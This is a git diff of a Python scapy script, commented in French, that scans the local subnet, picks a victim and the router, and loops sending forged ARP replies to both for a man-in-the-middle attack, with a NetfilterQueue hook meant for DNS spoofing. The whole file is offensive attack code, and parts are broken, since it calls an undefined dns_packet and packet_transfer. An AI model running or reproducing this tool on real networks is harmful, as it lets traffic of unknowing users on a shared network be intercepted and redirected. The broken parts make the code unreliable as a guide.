@@ -1,37 +1,37 @@
 #!/usr/bin/env python3
-from scapy.all import ARP, Ether, srp, get_if_hwaddr
 
-packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.1.0/24") # Cree les paquets
+from scapy.all import *
+from scapy.all import IP, Ether, ARP, UDP, DNS, DNSRR, DNSQR
+from netfilterqueue import NetfilterQueue
 
-victimes = [] # tableau des appareils presents
+network_addr = get_if_addr(conf.iface).split('.')
+network_addr = network_addr[0] + "." + network_addr[1] + "." + network_addr[2] + ".0/24" # obtient l'adresse ip du réseau
+mac_of_atk = get_if_hwaddr(conf.iface) # obtient l'adresse mac de l'attaquant
 
-for sent, received in srp(packet, timeout=3)[0]:
-    victimes.append({'ip': received.psrc, 'mac': received.hwsrc})
-# Ajoute les infos de chaque nouvel appareil trouve dans le tableau
+arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network_addr) # Cree les paquets
 
-print("\n" + "Available devices in the network :" + "\n" + "IP" + " "*18 + "MAC")
-for victime in victimes: # affiche les adresse ip et mac des appareils connectes au reseau qui sont dans le tableau victimes
-    print(victime['ip'])
-    print(victime['mac'] + "\n")
+IP_MAC_responses, unans = srp(arp_packet, timeout=2)
 
-for i in victimes:
-    if i['ip'] == "192.168.1.12":
-        passerelle_ip = victimes['ip'][i]
-        passerelle_mac = victimes['mac'][i]
-    if i['ip'] == "192.168.1.11":
-        victime_ip = victimes['ip'][i]
-        victime_mac = victimes['mac'][i]
-    if i['ip'] == "192.168.1.254": 
-        routeur_ip = victimes['ip'][i]       
-        routeur_mac = victimes['mac'][i]
-atk_mac = '08:00:27:c0:36:64'
+MAC_on_network = []
+IP_on_network = []
 
-nb_packets = 0
-while nb_packets < 100:
-    spoof_arp_victime = Ether(src=atk_mac)/ARP(op=2, pdst=victime_ip, hwdst=victime_mac, psrc=passerelle_ip)
-    spoof_arp_routeur = Ether(src=atk_mac)/ARP(op=2, pdst=routeur_ip, hwdst=routeur_mac, psrc=passerelle_ip)
-    send_spoof1 = sendp(spoof_arp_routeur)
-    send_spoof2 = sendp(spoof_arp_victime)
-    nb_packets += 2
+for i in range(len(IP_MAC_responses)):
+    MAC_on_network.append(IP_MAC_responses[i][1].hwsrc) # récupére les mac dans le réseau
+    IP_on_network.append(IP_MAC_responses[i][1].psrc) # récupére les ip dans le réseau
 
-print(nb_packets)
+victim_IP = IP_on_network[1]
+victim_MAC = MAC_on_network[1]
+
+routeur_IP = IP_on_network[2]
+routeur_MAC = MAC_on_network[2]
+
+queue = NetfilterQueue()
+
+while True: # MITM 
+    spoof_arp_routeur = Ether(src=mac_of_atk)/ARP(op=2, pdst=routeur_IP, hwdst=routeur_MAC, psrc=victim_IP)
+    spoof_arp_victim = Ether(src=mac_of_atk)/ARP(op=2, pdst=victim_IP, hwdst=victim_MAC, psrc=routeur_IP)
+    send_spoof2 = sendp(spoof_arp_routeur)
+    send_spoof1 = sendp(spoof_arp_victim)
+    queue.bind(0, dns_packet)
+    queue.run()
+    packet_transfer(dns_packet)
